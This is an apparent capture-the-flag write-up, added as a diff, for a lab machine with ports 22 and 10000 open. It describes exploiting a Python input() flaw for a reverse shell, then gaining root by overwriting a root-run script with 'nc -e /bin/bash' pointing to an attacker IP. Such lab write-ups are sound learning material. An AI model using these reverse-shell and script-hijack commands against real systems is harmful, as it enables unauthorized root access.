@@ -1,0 +1,25 @@
+After scan with nmap , machine has 2 port 22 and 10000
+using " nc 10.10.226.122 10000" we know that the server run on python
+so we should exploit bypass input() func 
+read this post : https://intx0x80.blogspot.com/2017/05/python-input-vulnerability_25.html
+so we wil creat a revershell 
+nc -lvnp 1234
+python3 exploit.py
+
+=> we connect to machine
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+1 . cat user.txt we have 1 flag
+2 . GET ROOT 
+using ls -al
+we see file 
+1. root.sh is root's file but it in home directory so even we don't have write permission we still excute it
+first remove this file " rm root.sh "
+echo ' #!/bin/bash#' > root.sh 
+echo 'nc -e /bin/bash 10.9.233.44 1235" >> root.sh
+chmod +x root.sh
+so we full permision with root.sh
+open new terminal and type "nc -lvnp 1235"
+./root.sh
+so we become root
+cat /root/root.txt
+
